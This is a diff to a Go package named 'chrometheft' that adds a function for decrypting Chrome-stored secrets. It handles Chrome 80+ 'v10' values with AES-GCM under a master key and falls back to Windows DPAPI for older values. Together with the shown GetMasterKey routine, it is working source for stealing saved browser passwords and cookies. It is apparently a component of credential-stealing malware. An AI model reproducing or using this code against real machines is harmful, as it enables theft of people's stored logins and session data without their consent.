@@ -1,6 +1,8 @@
 package chrometheft
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -85,4 +87,38 @@ func GetMasterKey(path string) ([]byte, error) {
 	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
 
 	return masterKey, err
+}
+
+func DecryptEncryptedData(encryptedData string, masterKey []byte) (string, error) {
+	if strings.HasPrefix(encryptedData, "v10") { // chrome 80+
+		if masterKey == nil || len(masterKey) == 0 {
+			return "", errors.New("No master key found")
+		}
+		c, err := aes.NewCipher(masterKey)
+		if err != nil {
+			return "", err
+		}
+		gcm, err := cipher.NewGCM(c)
+		if err != nil {
+			return "", err
+		}
+		nonceSize := gcm.NonceSize()
+		cipherText := []byte(encryptedData[3:])
+		if len(cipherText) < nonceSize {
+			return "", err
+		}
+
+		nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]
+		plainText, err := gcm.Open(nil, nonce, cipherText, nil)
+		if err != nil {
+			return "", err
+		}
+		return string(plainText), nil
+	} else {
+		pwd, err := Decrypt([]byte(encryptedData))
+		if err != nil {
+			return "", err
+		}
+		return string(pwd), nil
+	}
 }
